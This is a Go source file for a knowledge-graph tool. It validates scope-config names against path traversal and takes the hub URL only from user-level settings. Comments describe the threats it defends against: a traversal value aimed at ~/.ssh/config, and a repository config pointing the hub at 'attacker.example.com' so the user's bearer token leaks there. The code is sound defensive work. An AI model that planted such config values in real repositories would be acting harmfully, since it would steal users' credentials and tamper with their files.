package knowledge

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// ScopeConfig defines a knowledge graph scope - what gets indexed into a specific database.
// Scopes enable multi-layered KGs in monorepos (e.g., platform.db + selling.db).
type ScopeConfig struct {
	// Name of this scope (e.g., "platform", "selling")
	Name string `json:"name"`

	// Database filename relative to .ai/ directory (e.g., "platform.db", "selling.db")
	Database string `json:"database"`

	// HubGraph overrides the name this scope is published under on a shared hub.
	// Empty means the default naming rule applies (<repo> for the default scope,
	// <repo>.<scope> otherwise). Needed because `kg push --graph` names a single
	// database and so cannot express per-scope names during --all-scopes.
	HubGraph string `json:"hubGraph,omitempty"`

	// Layers are other scopes to federate with (read-only). Queries merge results from all layers.
	// Example: ["platform"] means this scope builds on platform knowledge.
	Layers []string `json:"layers,omitempty"`

	// Remotes are hub graph names to federate into searches (read-only), ranked
	// above the personal store but below local layers. Requires "hub" in
	// .ai/config.json. See docs/kg-shared-service.md.
	Remotes []string `json:"remotes,omitempty"`

	// Include patterns (glob-style, relative to project root). Default: ["**/*"]
	Include []string `json:"include,omitempty"`

	// Exclude patterns (glob-style, relative to project root). Applied after Include.
	Exclude []string `json:"exclude,omitempty"`

	// IncludeModules lists specific modules/ subdirectories to include.
	// When set, "modules/**/*" is implicitly excluded, then these are re-included.
	// Example: ["SellingModule", "M2M"] includes only modules/SellingModule/** and modules/M2M/**
	IncludeModules []string `json:"includeModules,omitempty"`
}

// scopeComponentRE constrains every name that becomes a single filesystem path
// component. It deliberately mirrors the hub's graphNameRE (internal/hub), because
// scope names, layer names and remote graph names are joined into paths and into
// hub request URLs by the same rules.
var scopeComponentRE = regexp.MustCompile(`^[a-zA-Z0-9._-]{1,64}$`)

// validScopeComponent reports whether name is safe to join into a path as a single
// component. The regex alone admits "." and ".." -- path navigation, not names --
// so they are rejected explicitly.
func validScopeComponent(name string) bool {
	return scopeComponentRE.MatchString(name) && name != "." && name != ".."
}

// checkScopeComponent wraps validScopeComponent with an error that names the field,
// so a rejected config says which key in which file is at fault.
func checkScopeComponent(field, value, path string) error {
	if !validScopeComponent(value) {
		return fmt.Errorf("scope config %s: %s %q is not a valid name: expected 1-64 characters "+
			"from [a-zA-Z0-9._-] and not \".\" or \"..\" (it is joined into a filesystem path, "+
			"so path separators and parent-directory references are refused)", path, field, value)
	}
	return nil
}

// LoadScopeConfig reads a scope config from .ai/scope/<name>.json
//
// Everything here is attacker-controlled in the threat model that matters: `kg
// index` is run against repositories that were merely cloned, and .ai/scope/*.json
// ships inside the repository. Database, Layers and Remotes are all joined into
// filesystem paths (or hub URLs) by roughly a dozen call sites across the CLI and
// the MCP server, and scopeName is joined into this function's own read path.
//
// A config saying {"database": "../../../../home/user/.ssh/config"} would otherwise
// make `kg index` create a Kuzu database over that file, and ArchiveDatabase would
// os.Rename files there during a storage-format migration. So validation lives here,
// at the single point every one of those call sites passes through, rather than
// being re-derived correctly at each of them.
func LoadScopeConfig(aiDir, scopeName string) (*ScopeConfig, error) {
	// Validate before the name reaches filepath.Join: this is also the arbitrary-read
	// half of the problem, since scopeName arrives from the --scope flag and from
	// layer names inside repo-supplied config.
	if err := checkScopeComponent("scope name", scopeName, filepath.Join(aiDir, "scope")); err != nil {
		return nil, err
	}

	path := filepath.Join(aiDir, "scope", scopeName+".json")
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read scope config %s: %w", path, err)
	}

	var cfg ScopeConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("parse scope config %s: %w", path, err)
	}

	// Validate required fields
	if cfg.Name == "" {
		cfg.Name = scopeName
	}
	if cfg.Database == "" {
		return nil, fmt.Errorf("scope config %s missing required field: database", path)
	}

	// Database is a bare filename with an extension ("platform.db"), never a path.
	if err := checkScopeComponent("database", cfg.Database, path); err != nil {
		return nil, err
	}
	if err := checkScopeComponent("name", cfg.Name, path); err != nil {
		return nil, err
	}
	if cfg.HubGraph != "" {
		if err := checkScopeComponent("hubGraph", cfg.HubGraph, path); err != nil {
			return nil, err
		}
	}
	for _, layer := range cfg.Layers {
		// Layers are scope names; each one is fed back into LoadScopeConfig and
		// joined into a database path by federated.go.
		if err := checkScopeComponent("layer", layer, path); err != nil {
			return nil, err
		}
	}
	for _, remote := range cfg.Remotes {
		// Remotes are hub graph names; they become path segments of a hub request.
		if err := checkScopeComponent("remote", remote, path); err != nil {
			return nil, err
		}
	}

	// Apply defaults
	if len(cfg.Include) == 0 {
		cfg.Include = []string{"**/*"}
	}

	return &cfg, nil
}

// ListScopeConfigs returns all scope configs found in .ai/scope/
// Returns empty slice (not error) if scope directory doesn't exist.
func ListScopeConfigs(aiDir string) ([]*ScopeConfig, error) {
	scopeDir := filepath.Join(aiDir, "scope")
	entries, err := os.ReadDir(scopeDir)
	if os.IsNotExist(err) {
		return nil, nil // No scopes defined - use legacy single-DB mode
	}
	if err != nil {
		return nil, fmt.Errorf("read scope directory: %w", err)
	}

	var configs []*ScopeConfig
	for _, entry := range entries {
		if entry.IsDir() || filepath.Ext(entry.Name()) != ".json" {
			continue
		}
		scopeName := entry.Name()[:len(entry.Name())-5] // strip .json
		cfg, err := LoadScopeConfig(aiDir, scopeName)
		if err != nil {
			return nil, err
		}
		configs = append(configs, cfg)
	}

	return configs, nil
}

// ShouldIncludePath checks if a path (relative to project root) should be indexed
// according to this scope config.
func (sc *ScopeConfig) ShouldIncludePath(relPath string) bool {
	// Check if path is in modules/ and handle IncludeModules logic
	if len(sc.IncludeModules) > 0 {
		if matched, module := matchesModulePath(relPath); matched {
			// Path is in modules/ - only include if module is in IncludeModules
			return contains(sc.IncludeModules, module)
		}
		// Path not in modules/ - fall through to normal Include/Exclude logic
	}

	// Apply exclude patterns first
	for _, pattern := range sc.Exclude {
		if matched, _ := filepath.Match(pattern, relPath); matched {
			return false
		}
		// Also check glob-style ** patterns
		if matchGlob(pattern, relPath) {
			return false
		}
	}

	// Apply include patterns
	for _, pattern := range sc.Include {
		if matched, _ := filepath.Match(pattern, relPath); matched {
			return true
		}
		if matchGlob(pattern, relPath) {
			return true
		}
	}

	return false
}

// matchesModulePath checks if path is under modules/ and returns (true, moduleName) if so.
// Example: "modules/SellingModule/src/foo.swift" → (true, "SellingModule")
func matchesModulePath(relPath string) (bool, string) {
	// Normalize to forward slashes
	normalized := filepath.ToSlash(relPath)

	// Check if path starts with "modules/"
	if len(normalized) < 8 || normalized[:8] != "modules/" {
		return false, ""
	}

	// Extract the module name (first path segment after "modules/")
	remainder := normalized[8:]
	sepIdx := -1
	for i, c := range remainder {
		if c == '/' {
			sepIdx = i
			break
		}
	}

	if sepIdx > 0 {
		return true, remainder[:sepIdx]
	}

	// Path is exactly "modules/ModuleName" with no trailing slash
	if remainder != "" {
		return true, remainder
	}

	return false, ""
}

// matchGlob implements basic ** glob matching (recursive wildcard)
func matchGlob(pattern, path string) bool {
	// Normalize both to forward slashes for consistent matching
	pattern = filepath.ToSlash(pattern)
	path = filepath.ToSlash(path)

	// "**/*" matches everything
	if pattern == "**/*" {
		return true
	}

	// Handle "prefix/**/*" pattern (e.g., "modules/**/*")
	if prefix, ok := strings.CutSuffix(pattern, "/**/*"); ok && prefix != "" {
		return path == prefix || strings.HasPrefix(path, prefix+"/")
	}

	// Handle "**" at the start (e.g., "**/foo.txt")
	if len(pattern) > 3 && pattern[:3] == "**/" {
		suffix := pattern[3:]
		// Check if path ends with the suffix or has it as a path component
		if matched, _ := filepath.Match(suffix, filepath.Base(path)); matched {
			return true
		}
		// Check each directory level
		for p := path; p != "." && p != "/"; p = filepath.Dir(p) {
			if matched, _ := filepath.Match(suffix, p); matched {
				return true
			}
		}
	}

	return false
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// GetDefaultScope reads the default scope from .ai/config.json
// Returns empty string if no default is set.
func GetDefaultScope(aiDir string) (string, error) {
	configPath := filepath.Join(aiDir, "config.json")
	data, err := os.ReadFile(configPath)
	if os.IsNotExist(err) {
		return "", nil
	}
	if err != nil {
		return "", fmt.Errorf("read config: %w", err)
	}

	var config struct {
		DefaultScope string `json:"defaultScope"`
	}
	if err := json.Unmarshal(data, &config); err != nil {
		return "", fmt.Errorf("parse config: %w", err)
	}

	return config.DefaultScope, nil
}

// Hub URL resolution.
//
// The hub URL is deliberately NOT taken from the repository being indexed.
//
// It used to be: GetHubURL read `.ai/config.json` out of the checkout, and
// OpenFederatedStore then handed that URL to remote.NewLayer along with
// KG_HUB_READ_TOKEN from the user's environment, which the layer sends as an
// Authorization: Bearer header. Scope configs are meant to be committed and
// shared, so a repository could ship
//
//	{"hub": "https://attacker.example.com"}
//
// and any `kg search` — or any agent's search_knowledge call — in that checkout
// would send the query text and the user's hub credential to a host the
// repository chose. That is a confused deputy: ambient authority aimed by
// untrusted data. It fails silently too, because it does not fail — it succeeds
// against the wrong host.
//
// So the destination is the user's decision and the repository's is not. A repo
// may still say which *graphs* it wants federated, via a scope's `remotes`;
// naming graphs on a hub the user already trusts carries no authority.

// hubURLEnv overrides the configured hub for one invocation.
const hubURLEnv = "KG_HUB_URL"

// UserConfigPath returns the user-level kg config file. Honours KG_HOME the
// same way the personal store does (see personalDir in the kg package, which
// resolves the same base directory for the store itself).
func UserConfigPath() (string, error) {
	if dir := os.Getenv("KG_HOME"); dir != "" {
		return filepath.Join(dir, "config.json"), nil
	}
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("determine home directory (set KG_HOME to override): %w", err)
	}
	return filepath.Join(home, ".kg", "config.json"), nil
}

// GetHubURL returns the hub this user has chosen to trust, or "" if none.
//
// aiDir is still accepted so callers can be told when a repository names a hub
// that is being ignored — see RepoSuggestedHubURL. It is never a source of the
// URL itself.
func GetHubURL(aiDir string) (string, error) {
	if url := strings.TrimSpace(os.Getenv(hubURLEnv)); url != "" {
		return url, nil
	}

	path, err := UserConfigPath()
	if err != nil {
		return "", err
	}
	url, err := readHubKey(path)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(url), nil
}

// RepoSuggestedHubURL returns the hub a repository names in .ai/config.json.
//
// Returned for reporting only — so a command can tell the user "this project
// expects hub X; trust it with `kg config set-hub X`" and leave the decision
// with them. Never pass this to anything that will send a credential to it.
func RepoSuggestedHubURL(aiDir string) string {
	url, err := readHubKey(filepath.Join(aiDir, "config.json"))
	if err != nil {
		return ""
	}
	return strings.TrimSpace(url)
}

// SetUserHubURL records the hub this user trusts, creating the config if needed.
func SetUserHubURL(hubURL string) (string, error) {
	path, err := UserConfigPath()
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return "", fmt.Errorf("create config directory: %w", err)
	}

	config := map[string]any{}
	if data, err := os.ReadFile(path); err == nil {
		if err := json.Unmarshal(data, &config); err != nil {
			return "", fmt.Errorf("parse %s: %w", path, err)
		}
	} else if !os.IsNotExist(err) {
		return "", fmt.Errorf("read %s: %w", path, err)
	}

	config["hub"] = hubURL
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return "", fmt.Errorf("encode config: %w", err)
	}
	if err := os.WriteFile(path, append(data, '\n'), 0600); err != nil {
		return "", fmt.Errorf("write %s: %w", path, err)
	}
	return path, nil
}

// readHubKey reads the "hub" key from a config file, treating a missing file as
// no hub rather than an error.
func readHubKey(path string) (string, error) {
	data, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		return "", nil
	}
	if err != nil {
		return "", fmt.Errorf("read config: %w", err)
	}

	var config struct {
		Hub string `json:"hub"`
	}
	if err := json.Unmarshal(data, &config); err != nil {
		return "", fmt.Errorf("parse config %s: %w", path, err)
	}
	return config.Hub, nil
}

// SetDefaultScope sets the default scope in .ai/config.json
func SetDefaultScope(aiDir, scopeName string) error {
	configPath := filepath.Join(aiDir, "config.json")

	// Read existing config or create new
	var config map[string]interface{}
	data, err := os.ReadFile(configPath)
	if err == nil {
		if err := json.Unmarshal(data, &config); err != nil {
			return fmt.Errorf("parse existing config: %w", err)
		}
	} else if !os.IsNotExist(err) {
		return fmt.Errorf("read config: %w", err)
	} else {
		config = make(map[string]interface{})
	}

	// Update default scope
	if scopeName == "" {
		delete(config, "defaultScope")
	} else {
		config["defaultScope"] = scopeName
	}

	// Write back
	data, err = json.MarshalIndent(config, "", "  ")
	if err != nil {
		return fmt.Errorf("marshal config: %w", err)
	}

	if err := os.WriteFile(configPath, data, 0644); err != nil {
		return fmt.Errorf("write config: %w", err)
	}

	return nil
}
